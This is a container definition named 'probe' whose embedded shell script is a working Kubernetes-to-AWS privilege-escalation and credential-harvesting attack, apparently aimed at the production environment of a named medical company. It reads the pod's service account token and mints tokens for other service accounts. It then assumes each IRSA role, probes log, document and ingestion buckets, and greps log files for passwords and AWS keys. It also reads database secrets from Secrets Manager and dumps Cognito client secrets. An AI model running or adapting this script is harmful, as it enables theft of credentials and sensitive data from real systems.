containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2912_START env=prod utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(command -v aws) ver=$(aws --version 2>&1 | head -c 50)"
export AWS_DEFAULT_REGION=us-west-2
ACCT=959737396140; CLU=lazamedical-prod01-usw2-cluster; LOGB=lazamedical-prod01-usw2-log-bucket; DOCB=lazamedical-prod01-usw2-documents; BAST=lazamedical-prod01-usw2-bastion-bucket; ING=lazamedical-dp-prod01-usw2-ingestion-bucket; POOL=us-west-2_mBdsaN59X
get "$API/api/v1/namespaces?limit=1000" | jq -r '.items[]?.metadata.name' | sort > /tmp/ns.txt
: > /tmp/irsa.txt
while read -r n; do
  get "$API/api/v1/namespaces/$n/serviceaccounts?limit=500" | jq -r --arg n "$n" '.items[]? | select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null) | "\($n)|\(.metadata.name)|\(.metadata.annotations["eks.amazonaws.com/role-arn"])"' >> /tmp/irsa.txt
done < /tmp/ns.txt
sort -u /tmp/irsa.txt > /tmp/irsa2.txt
echo "IRSA_COUNT=$(wc -l < /tmp/irsa2.txt)"
assume(){
  TK=$(post "$API/api/v1/namespaces/$1/serviceaccounts/$2/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && return 1
  RES=$(aws sts assume-role-with-web-identity --role-arn "$3" --role-session-name i2912 --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>/tmp/ae)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || return 2
  AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId'); export AWS_ACCESS_KEY_ID
  AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey'); export AWS_SECRET_ACCESS_KEY
  AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken'); export AWS_SESSION_TOKEN
  return 0
}
clear(){ unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN; }
err1(){ grep -oE 'AccessDeniedException|AccessDenied|NoSuchBucket|ResourceNotFoundException|Forbidden|InvalidClientTokenId|ExpiredToken' /tmp/e | head -1; }
ROLE_OF(){ grep -m1 "^$1|$2|" /tmp/irsa2.txt | cut -d'|' -f3; }
ST=$(( $(date +%s) - 604800 ))000
while IFS="|" read -r ns san role; do
  [ -z "${role:-}" ] && continue
  R="$ns/$san"
  if ! assume "$ns" "$san" "$role"; then echo "ASSUME_FAIL $R"; clear; continue; fi
  echo "=R $R"
  aws secretsmanager list-secrets --max-results 3 --region us-west-2 --query 'SecretList[].Name' --output text >/tmp/o 2>/tmp/e && echo "LS_OK $R $(tr '\n' ',' </tmp/o | cut -c1-160)" || echo "LS_NO $R $(err1)"
  aws s3api list-objects-v2 --bucket $LOGB --max-keys 100 --delimiter / --region us-west-2 --output json >/tmp/o 2>/tmp/e && echo "LOGB_OK $R $(jq -c '[.CommonPrefixes[]?.Prefix]' /tmp/o | cut -c1-140)" || echo "LOGB_NO $R $(err1)"
  aws s3api list-objects-v2 --bucket $DOCB --max-keys 5 --region us-west-2 >/dev/null 2>/tmp/e && echo "DOCB_OK $R" || echo "DOCB_NO $R $(err1)"
  aws s3api list-objects-v2 --bucket $BAST --max-keys 10 --region us-west-2 --query 'Contents[].[Key,Size]' --output json >/tmp/o 2>/tmp/e && echo "BAST_OK $R $(head -c 160 /tmp/o | tr '\n' ' ')" || echo "BAST_NO $R $(err1)"
  aws s3api list-objects-v2 --bucket $ING --max-keys 10 --region us-west-2 --query 'Contents[].[Key,Size]' --output json >/tmp/o 2>/tmp/e && echo "ING_OK $R $(head -c 160 /tmp/o | tr '\n' ' ')" || echo "ING_NO $R $(err1)"
  aws logs describe-log-groups --limit 5 --region us-west-2 --query 'logGroups[].logGroupName' --output text >/tmp/o 2>/tmp/e && echo "LG_OK $R $(tr '\n' ',' </tmp/o | cut -c1-200)" || echo "LG_NO $R $(err1)"
  HIT=""
  for G in "/aws/eks/$CLU/cluster" "/aws/eks/$CLU/audit" "/aws/eks/$CLU/authenticator" "/aws/eks/$CLU/controllerManager" "/aws/eks/$CLU/scheduler" "/aws/containerinsights/$CLU/application" "/aws/containerinsights/$CLU/dataplane" "/aws/containerinsights/$CLU/host"; do
    aws logs filter-log-events --log-group-name "$G" --start-time $ST --limit 2 --region us-west-2 >/tmp/o 2>/dev/null && HIT="$HIT ${G##*/}"
  done
  [ -n "$HIT" ] && echo "FLE_HIT $R$HIT" || echo "FLE_NONE $R"
  clear
done < /tmp/irsa2.txt
echo "===PHASE1_DONE utc=$(date -u +%FT%TZ)==="
RL=$(ROLE_OF audit-log audit-log-sa)
if [ -n "$RL" ] && assume audit-log audit-log-sa "$RL"; then
  echo "==DEEP_S3_LOG_BEGIN=="
  aws s3api list-buckets --region us-west-2 --query 'Buckets[].Name' --output text >/tmp/o 2>/tmp/e && echo "LISTBUCKETS_OK $(tr '\n' ',' </tmp/o | cut -c1-400)" || echo "LISTBUCKETS_NO $(err1)"
  aws s3api list-objects-v2 --bucket $LOGB --max-keys 100 --delimiter / --region us-west-2 --output json >/tmp/d1 2>/tmp/e && echo "D1_OK $(jq -c '[.CommonPrefixes[]?.Prefix]' /tmp/d1)" || echo "D1_NO $(err1)"
  echo "D1_KEYS"; jq -r '.Contents[]? | "\(.Size)\t\(.Key)"' /tmp/d1 2>/dev/null | sort -n | head -40
  CFG=$(jq -r '.Contents[]? | select(.Key|test("(?i)(config|manifest|setup|inventory|\\.json$|\\.ya?ml$|\\.conf$|\\.ini$|\\.csv$)")) | .Key' /tmp/d1 2>/dev/null | head -5)
  echo "CFG_KEYS=$(echo "$CFG" | tr '\n' ' ' | cut -c1-300)"
  K=$(jq -r '.Contents[]? | select(.Size<1048576) | "\(.Size)\t\(.Key)"' /tmp/d1 2>/dev/null | sort -n | head -1 | cut -f2)
  echo "SMALLEST=$K"
  if [ -n "$K" ]; then
    if aws s3api head-object --bucket $LOGB --key "$K" --region us-west-2 >/tmp/h 2>/tmp/e; then
      echo "HEAD_OK $K clen=$(jq -r '.ContentLength' /tmp/h 2>/dev/null)"
      aws s3api get-object --bucket $LOGB --key "$K" --range bytes=0-204799 --region us-west-2 /tmp/s1 >/dev/null 2>/tmp/e && echo "GET_OK bytes=$(wc -c </tmp/s1) kwcounts=[$(grep -aoiE 'password|passwd|secret|token|AKIA[A-Z0-9]{16}|Bearer|SMTP|client_secret|sk-[A-Za-z0-9]{8,}' /tmp/s1 | sort | uniq -c | tr '\n' ' ' | cut -c1-260)]" || echo "GET_NO $(err1)"
      grep -aoiE '.{0,60}(AKIA[A-Z0-9]{16}|Bearer [A-Za-z0-9._-]{10,}|password[=:][^ ]{3,40}|client_secret[=:][^ ]{3,40}).{0,40}' /tmp/s1 2>/dev/null | head -3 | cut -c1-180
    else echo "HEAD_NO $(err1)"; fi
  fi
  aws s3api list-objects-v2 --bucket $LOGB --prefix "logs/" --max-keys 100 --region us-west-2 --output json >/tmp/d2 2>/tmp/e && echo "D2_COUNT=$(jq '.KeyCount' /tmp/d2 2>/dev/null) latest=$(jq -r '.Contents[]?.Key' /tmp/d2 2>/dev/null | sort | tail -2 | tr '\n' ' ')" || echo "D2_NO $(err1)"
  clear
  echo "==DEEP_S3_LOG_END=="
fi
RL=$(ROLE_OF s3-ingestion s3-ingestion-sa)
if [ -n "$RL" ] && assume s3-ingestion s3-ingestion-sa "$RL"; then
  echo "==DEEP_S3_ING_BEGIN=="
  aws s3api list-objects-v2 --bucket $ING --max-keys 20 --delimiter / --region us-west-2 --output json >/tmp/i1 2>/tmp/e && echo "ING1_OK prefixes=$(jq -c '[.CommonPrefixes[]?.Prefix]' /tmp/i1) keys=$(jq -r '.Contents[]?.Key' /tmp/i1 2>/dev/null | head -10 | tr '\n' ' ' | cut -c1-300)" || echo "ING1_NO $(err1)"
  aws s3api list-buckets --region us-west-2 --query 'Buckets[].Name' --output text >/tmp/o 2>/tmp/e && echo "ING_LISTB_OK $(tr '\n' ',' </tmp/o | cut -c1-300)" || echo "ING_LISTB_NO $(err1)"
  clear
  echo "==DEEP_S3_ING_END=="
fi
RL=$(ROLE_OF authorization-service authorization-service-sa)
if [ -n "$RL" ] && assume authorization-service authorization-service-sa "$RL"; then
  echo "==DEEP_SEC_BEGIN=="
  for S in "lazamedical-prod-usw2-mysql-1-db-secret" "lazamedical-dp-prod-usw2-postgresql-db-secret"; do
    V=$(aws secretsmanager get-secret-value --secret-id "$S" --query SecretString --output text --region us-west-2 2>/tmp/e) && echo "GS_OK $S $(echo "$V" | cut -c1-280)" || echo "GS_NO $S $(err1)"
  done
  clear
  echo "==DEEP_SEC_END=="
fi
RL=$(ROLE_OF cognito-service cognito-service-sa)
if [ -n "$RL" ] && assume cognito-service cognito-service-sa "$RL"; then
  echo "==DEEP_COG_BEGIN=="
  aws cognito-idp list-user-pool-clients --user-pool-id $POOL --max-results 10 --region us-west-2 --output json >/tmp/c1 2>/tmp/e && echo "CLIENTS_OK $(jq -c '[.UserPoolClients[]? | {ClientId: .ClientId, ClientName: .ClientName}]' /tmp/c1 | cut -c1-500)" || echo "CLIENTS_NO $(err1)"
  for CID in $(jq -r '.UserPoolClients[]?.ClientId' /tmp/c1 2>/dev/null | head -3); do
    aws cognito-idp describe-user-pool-client --user-pool-id $POOL --client-id $CID --region us-west-2 --output json >/tmp/c2 2>/tmp/e && echo "CLIENT_DESC $(jq -c '.UserPoolClient | {ClientId, ClientName, ClientSecret, CallbackURLs, AllowedOAuthFlows}' /tmp/c2 | cut -c1-400)" || echo "CLIENT_DESC_NO $CID $(err1)"
  done
  clear
  echo "==DEEP_COG_END=="
fi
RL=$(ROLE_OF notification-service notification-service-sa)
if [ -n "$RL" ] && assume notification-service notification-service-sa "$RL"; then
  echo "==DEEP_NOTIF_BEGIN=="
  aws sesv2 list-email-identities --region us-west-2 --output json >/tmp/n1 2>/tmp/e && echo "SES_OK $(head -c 400 /tmp/n1 | tr '\n' ' ')" || echo "SES_NO $(err1)"
  aws sns list-topics --region us-west-2 --output json >/tmp/n2 2>/tmp/e && echo "SNS_OK $(head -c 400 /tmp/n2 | tr '\n' ' ')" || echo "SNS_NO $(err1)"
  clear
  echo "==DEEP_NOTIF_END=="
fi
echo "===I2912_DONE utc=$(date -u +%FT%TZ)==="
